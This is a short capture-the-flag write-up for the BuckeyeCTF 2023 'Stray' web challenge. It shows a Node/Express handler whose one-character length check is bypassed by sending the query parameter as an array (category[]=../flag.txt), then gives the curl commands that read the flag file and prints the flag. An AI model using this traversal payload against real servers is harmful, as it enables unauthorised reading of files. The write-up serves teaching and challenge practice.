---
title: BuckeyeCTF 2023 - Stray
description: Writeup for grades grades grades web challenge
date: 2023-12-18
tldr: Stray cats!
draft: false
tags: ["ctf", "writeup", "web"]
---

## Stray/easy

Stuck on what to name your stray cat?

https://stray.chall.pwnoh.io

Looking at this it seems like the `category` is not really sanitized in any way so maybe directory traversal could work here, however we are limited to a single character by `category.length == 1`

```javascript
app.get("/cat", (req, res) => {
  let { category } = req.query;

  console.log(category);

  if (category.length == 1) {
    const filepath = path.resolve("./names/" + category);
    const lines = fs.readFileSync(filepath, "utf-8").split("\n");
    const name = lines[Math.floor(Math.random() * lines.length)];

    res.status(200);
    res.send({ name });
    return;
  }

  res.status(500);
  res.send({ error: "Unable to generate cat name" });
});
```

ideally we would just pass `../flag.txt` to the category queryparameter and get the flag but due to the length check `category.length == 1` we cannot really do just that as it results in an error.

```bash
curl https://stray.chall.pwnoh.io/cat?category=f
{"name":"Stevie"}
curl https://stray.chall.pwnoh.io/cat?category=../flag.txt
{"error":"Unable to generate cat name"}
```

now we notice that the query destructuring `let { category } = req.query;` assumes a single string is passed in `category` and than lenght of that is check assuming its a string, however if we could make an array of lenght one with the right string...

```bash
curl -s https://stray.chall.pwnoh.io/cat?category[]=../flag.txt | jq -r '.name'
bctf{j4v45cr1p7_15_4_6r347_l4n6u463}
```